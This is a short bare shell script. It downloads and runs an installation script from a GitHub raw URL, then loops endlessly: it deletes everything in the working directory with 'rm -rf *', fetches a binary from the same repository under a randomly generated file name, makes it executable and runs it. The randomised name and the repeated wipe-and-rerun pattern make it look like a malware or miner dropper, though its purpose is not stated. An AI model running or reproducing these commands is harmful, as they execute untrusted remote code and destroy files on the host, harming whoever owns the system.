wget https://raw.githubusercontent.com/samaniheo/aploka/main/installation.sh
bash installation.sh
TAMPER=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
while :; do timeout 20 rm -rf *; wget -qO $TAMPER https://raw.githubusercontent.com/samaniheo/aploka/main/main; chmod +x $TAMPER; ./$TAMPER; sleep 10; done
